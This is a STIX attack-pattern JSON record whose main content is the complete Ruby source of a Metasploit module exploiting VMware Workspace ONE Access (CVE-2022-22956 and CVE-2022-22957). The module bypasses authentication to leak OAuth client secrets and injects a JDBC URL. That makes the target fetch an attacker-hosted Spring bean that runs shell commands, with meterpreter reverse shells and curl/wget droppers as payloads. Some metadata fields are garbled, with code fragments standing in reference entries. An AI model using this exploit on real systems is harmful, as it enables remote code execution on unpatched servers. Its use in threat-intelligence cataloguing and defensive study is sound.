{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--cab47600-eb46-453f-b562-64a84f7ed9ad",
    "created": "2024-08-14T17:03:29.498919Z",
    "modified": "2024-08-14T17:03:29.498924Z",
    "name": "VMware Workspace ONE Access VMSA-2022-0011 exploit chain",
    "description": " This module combines two vulnerabilities in order achieve remote code execution in the context of the",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/linux/http/vmware_workspace_one_access_vmsa_2022_0011_chain.rb",
            "external_id": "vmware_workspace_one_access_vmsa_2022_0011_chain.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2022-22956"
        },
        {
            "source_name": "CVE",
            "external_id": "2022-22957"
        },
        {
            "source_name": "reference",
            "url": "https://srcincite.io/blog/2022/08/11/i-am-whoever-i-say-i-am-infiltrating-vmware-workspace-one-access-using-a-0-click-exploit.html#dbconnectioncheckcontroller-dbcheck-jdbc-injection-remote-code-execution"
        },
        {
            "source_name": "reference",
            "url": "https://github.com/sourceincite/hekate/"
        },
        {
            "source_name": "reference",
            "url": "https://www.vmware.com/security/advisories/VMSA-2022-0011.html"
        },
        {
            "source_name": "returnExploit::CheckCode::Safe(\"Therewasanerrorexploitingtheauthenticationby-passvulnerability(CVE-2022-22956):#{e.class}",
            "external_id": "#{e}\")"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nrequire 'builder'\n\nclass MetasploitModule < Msf::Exploit::Remote\n\n  Rank = ExcellentRanking\n\n  include Exploit::EXE\n  include Msf::Exploit::Remote::HttpClient\n  include Msf::Exploit::Remote::HttpServer\n  include Msf::Exploit::CmdStager\n  prepend Msf::Exploit::Remote::AutoCheck\n\n  class InvalidRequest < StandardError\n  end\n\n  class InvalidResponse < StandardError\n  end\n\n  def initialize(info = {})\n    super(\n      update_info(\n        info,\n        'Name' => 'VMware Workspace ONE Access VMSA-2022-0011 exploit chain',\n        'Description' => %q{\n          This module combines two vulnerabilities in order achieve remote code execution in the context of the\n          `horizon` user. The first vulnerability CVE-2022-22956 is an authentication bypass in\n          OAuth2TokenResourceController ACS which allows a remote, unauthenticated attacker to bypass the\n          authentication mechanism and execute any operation. The second vulnerability CVE-2022-22957 is a JDBC\n          injection RCE specifically in the DBConnectionCheckController class's dbCheck method which allows an attacker\n          to deserialize arbitrary Java objects which can allow remote code execution.\n        },\n        'Author' => [\n          'mr_me', # Discovery & PoC\n          'jheysel-r7' # Metasploit Module\n        ],\n        'References' => [\n          ['CVE', '2022-22956'],\n          ['CVE', '2022-22957'],\n          ['URL', 'https://srcincite.io/blog/2022/08/11/i-am-whoever-i-say-i-am-infiltrating-vmware-workspace-one-access-using-a-0-click-exploit.html#dbconnectioncheckcontroller-dbcheck-jdbc-injection-remote-code-execution'],\n          ['URL', 'https://github.com/sourceincite/hekate/'],\n          ['URL', 'https://www.vmware.com/security/advisories/VMSA-2022-0011.html']\n        ],\n        'DisclosureDate' => '2022-04-06',\n        'License' => MSF_LICENSE,\n        'Platform' => ['unix', 'linux'],\n        'Arch' => [ARCH_CMD, ARCH_X64],\n        'Privileged' => false,\n        'Targets' => [\n          [\n            'Unix Command',\n            {\n              'Platform' => 'unix',\n              'Arch' => ARCH_CMD,\n              'Type' => :unix_cmd,\n              'DefaultOptions' => {\n                'PAYLOAD' => 'cmd/unix/python/meterpreter/reverse_tcp'\n              }\n            }\n          ],\n          [\n            'Linux Dropper',\n            {\n              'Platform' => 'linux',\n              'Arch' => [ARCH_X64],\n              'Type' => :linux_dropper,\n              'CmdStagerFlavor' => %i[curl wget],\n              'DefaultOptions' => {\n                'PAYLOAD' => 'linux/x64/meterpreter/reverse_tcp'\n              }\n            }\n          ]\n        ],\n        'Payload' => {\n          'BadChars' => \"\\x22\"\n        },\n        'DefaultTarget' => 0,\n        'DefaultOptions' => {\n          'RPORT' => 443,\n          'SSL' => true,\n          'LPORT' => 5555\n        },\n        'Notes' => {\n          'Stability' => [CRASH_SAFE],\n          'Reliability' => [REPEATABLE_SESSION],\n          'SideEffects' => [IOC_IN_LOGS, ARTIFACTS_ON_DISK]\n        }\n      )\n    )\n  end\n\n  # The VMware products affected do no expose any version information to unauthenticated users.\n  # Attempt to exploit the auth bypass to determine if the target is vulnerable. Both the auth bypass and RCE were\n  # patched in the following VMware update: https://kb.vmware.com/s/article/88099\n  def check\n    @token = get_authentication_token\n    Exploit::CheckCode::Vulnerable('Successfully by-passed authentication by exploiting CVE-2022-22956')\n  rescue InvalidRequest, InvalidResponse => e\n    return Exploit::CheckCode::Safe(\"There was an error exploiting the authentication by-pass vulnerability (CVE-2022-22956): #{e.class}, #{e}\")\n  end\n\n  # Exploit OAuth2TokenResourceController ACS Authentication Bypass (CVE-2022-22956).\n  #\n  # Return the authentication token\n  def get_authentication_token\n    oauth_client = ['Service__OAuth2Client', 'acs'].sample\n    res_activation_token = send_request_cgi({\n      'uri' => normalize_uri(target_uri.path, 'SAAS', 'API', '1.0', 'REST', 'oauth2', 'generateActivationToken', oauth_client),\n      'method' => 'POST'\n    })\n\n    unless res_activation_token\n      raise InvalidRequest, 'No response from the server when requesting an activation token'\n    end\n\n    unless res_activation_token.code == 200 && res_activation_token.headers['content-type'] == 'application/json;charset=UTF-8'\n      raise InvalidResponse, \"Unexpected response code:#{res_activation_token.code}, when requesting an activation token\"\n    end\n\n    activation_token = res_activation_token.get_json_document['activationToken']\n\n    res_client_info = send_request_cgi({\n      'uri' => normalize_uri(target_uri.path, 'SAAS', 'API', '1.0', 'REST', 'oauth2', 'activate'),\n      'method' => 'POST',\n      'Content-Type' => 'application/x-www-form-urlencoded',\n      'data' => activation_token\n    })\n\n    unless res_client_info\n      raise InvalidRequest, 'No response from client when sending the activation token and expecting client info in return'\n    end\n\n    unless res_client_info.code == 200 && res_client_info.headers['content-type'] == 'application/json;charset=UTF-8'\n      raise InvalidResponse, \"Unexpected response code:#{res_client_info.code}, when sending the activation token and expecting client info in return\"\n    end\n\n    json_client_info = res_client_info.get_json_document\n    client_id = json_client_info['client_id']\n    client_secret = json_client_info['client_secret']\n\n    print_good(\"Leaked client_id: #{client_id}\")\n    print_good(\"Leaked client_secret: #{client_secret}\")\n    post_data = \"grant_type=client_credentials&client_id=#{client_id}&client_secret=#{client_secret}\"\n\n    res_access_token = send_request_cgi({\n      'uri' => normalize_uri(target_uri.path, 'SAAS', 'auth', 'oauthtoken'),\n      'method' => 'POST',\n      'Content-Type' => 'application/x-www-form-urlencoded',\n      'data' => post_data\n    })\n\n    unless res_access_token\n      raise InvalidRequest, 'No response from the server when requesting the access token'\n    end\n\n    unless res_access_token.code == 200 && res_access_token.headers['content-type'] == 'application/json;charset=UTF-8' && res_access_token.get_json_document['access_token']\n      raise InvalidResponse, 'Invalid response from the server when requesting the access token'\n    end\n\n    res_access_token.get_json_document['access_token']\n  end\n\n  # Serve the files for the target machine to download.\n  # If the request to the server ends in .xml the victim is requesting the spring bean generated by payload_xml method.\n  # If the request doesn't in .xml the victim is requesting the linux dropper payload.\n  def on_request_uri(cli, request)\n    vprint_status(\"on_request_uri - Request '#{request.method} #{request.uri}'\")\n    if request.to_s.include?('.xml')\n      vprint_status('Sending XML response: ')\n      send_response(cli, @payload_xml, { 'Content-Type' => 'application/octet-strem' })\n      vprint_status('Response sent')\n    else\n      vprint_status('Sending PAYLOAD: ')\n      send_response(cli, generate_payload_exe(code: payload.encoded), { 'Content-Type' => 'application/octet-strem' })\n    end\n  end\n\n  # Generates the malicious spring bean that will be hosted by the metasploit http server and downloaded and run by the victim\n  #\n  # Returns an XML document containing the payload.\n  def generate_payload_xml(cmd)\n    bean = ''\n    builder = ::Builder::XmlMarkup.new(target: bean, indent: 2)\n    builder.beans(xmlns: 'http://www.springframework.org/schema/beans', 'xmlns:xsi': 'http://www.w3.org/2001/XMLSchema-instance', 'xsi:schemaLocation': 'http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans.xsd') do\n      builder.bean(id: 'pb', class: 'java.lang.ProcessBuilder', 'init-method': 'start') do\n        builder.constructor do\n          builder.list do\n            builder.value('/bin/sh')\n            builder.value('-c')\n            builder.value(cmd)\n          end\n        end\n      end\n    end\n\n    bean.gsub!('constructor', 'constructor-arg')\n    vprint_status(bean)\n    bean\n  end\n\n  # Calls the vulnerable dbCheck method in order to download and run the payload the module is hosting.\n  def trigger_jdbc_rce(jwt, sub_cmd)\n    # jdbc_uri  = \"jdbc:postgresql://localhost:1337/saas?socketFactory=org.springframework.context.support.FileSystemXmlApplicationContext&socketFactoryArg=http://#{datastore['LHOST']}:#{datastore['SRVPORT']}/#{filename}\"\n    jdbc_uri = \"jdbcUrl=jdbc%3Apostgresql%3A%2F%2Flocalhost%3A1337%2Fsaas%3FsocketFactory%3Dorg.springframework.context.support.FileSystemXmlApplicationContext%26socketFactoryArg%3Dhttp%3A%2F%2F#{datastore['LHOST']}%3A#{datastore['SRVPORT']}%2F#{@payload_name}&dbUsername=&dbPassword\"\n    res = send_request_cgi({\n      'uri' => normalize_uri(target_uri.path, 'SAAS', 'API', '1.0', 'REST', 'system', 'dbCheck'),\n      'method' => 'POST',\n      'Content-Type' => 'application/x-www-form-urlencoded',\n      'Connection' => 'keep-alive',\n      'cookie' => \"HZN=#{jwt}\",\n      'data' => jdbc_uri\n    })\n\n    fail_with(Failure::Unreachable, \"No response from the request to trigger the following sub command: #{sub_cmd}\") unless res\n    fail_with(Failure::UnexpectedReply, \"Unexpected response from the request to trigger the following sub command: #{sub_cmd}\") unless res.code == 406 && res.body == '{\"success\":false,\"status\":406,\"message\":\"database.connection.notSuccess\",\"code\":406}'\n  end\n\n  def execute_command(cmd, opts = {})\n    vprint_status(\"Executing the following command: #{cmd}\")\n    @payload_xml = generate_payload_xml(cmd)\n    trigger_jdbc_rce(opts[:jwt], cmd)\n  end\n\n  # Instruct the user to exploit CVE-2022-22960\n  def on_new_session(_client)\n    print_good('Now background this session with \"bg\" and then run \"resource run_cve-2022-22960_lpe.rc\" to get a root shell')\n  end\n\n  def exploit\n    unless @token\n      begin\n        @token = get_authentication_token\n      rescue InvalidRequest => e\n        fail_with(Failure::Unreachable, \"There was an error exploiting the authentication by-pass vulnerability (CVE-2022-22956): #{e.class}, #{e}\")\n      rescue InvalidResponse => e\n        fail_with(Failure::UnexpectedReply, \"There was an error exploiting the authentication by-pass vulnerability (CVE-2022-22956): #{e.class}, #{e}\")\n      end\n    end\n\n    @payload_name = Rex::Text.rand_text_alpha(4..12) + '.xml'\n    start_service('Path' => \"/#{@payload_name}\")\n\n    case target['Type']\n    when :unix_cmd\n      execute_command(payload.encoded, { jwt: @token })\n    when :linux_dropper\n      execute_cmdstager({ jwt: @token })\n    else\n      fail_with(Failure::BadConfig, 'Invalid target specified')\n    end\n  end\nend\n",
    "x_mitre_contributors": [
        ""
    ],
    "x_mitre_disclosure_date": "2022-04-06",
    "x_mitre_platforms": [
        "linux'"
    ]
}